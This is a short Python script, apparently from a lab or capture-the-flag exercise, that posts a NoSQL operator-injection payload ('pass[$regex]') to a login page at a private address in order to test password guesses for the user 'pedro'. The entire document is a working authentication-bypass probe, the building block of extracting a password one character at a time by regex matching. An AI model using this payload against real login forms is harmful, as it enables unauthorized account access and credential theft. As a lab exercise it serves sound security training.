import requests

url = "http://10.10.1.19/login.php"
username = "pedro"
password_regex = "^c..........$"

# Set up form data payload
payload = {
    "user": username,
    "pass[$regex]": password_regex  # Use form-style encoding, not JSON
}

# Set headers to match Burp request
headers = {
    "Content-Type": "application/x-www-form-urlencoded",  # Set Content-Type to form-urlencoded
}

# Send the request without following redirects
r = requests.post(url, data=payload, allow_redirects=False)

# Print the response details
print("Response Code:", r.status_code)
print("Response Headers:", r.headers)
print("Response Message:", r.text)
